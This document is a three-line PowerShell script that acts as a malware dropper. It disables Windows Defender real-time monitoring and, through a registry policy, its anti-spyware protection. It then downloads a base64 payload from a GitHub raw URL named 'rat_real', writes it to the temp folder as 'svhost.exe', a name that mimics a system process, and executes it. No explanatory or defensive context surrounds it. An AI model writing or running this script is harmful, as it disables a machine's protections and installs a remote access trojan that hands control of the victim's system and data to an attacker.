Set-MpPreference -DisableRealtimeMonitoring $true
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
$exePath = "$env:TEMP\svhost.exe"; [System.IO.File]::WriteAllBytes($exePath, [System.Convert]::FromBase64String((irm "https://github.com/leetcodeuser123/temp/raw/main/rat_real"))); & $exePath
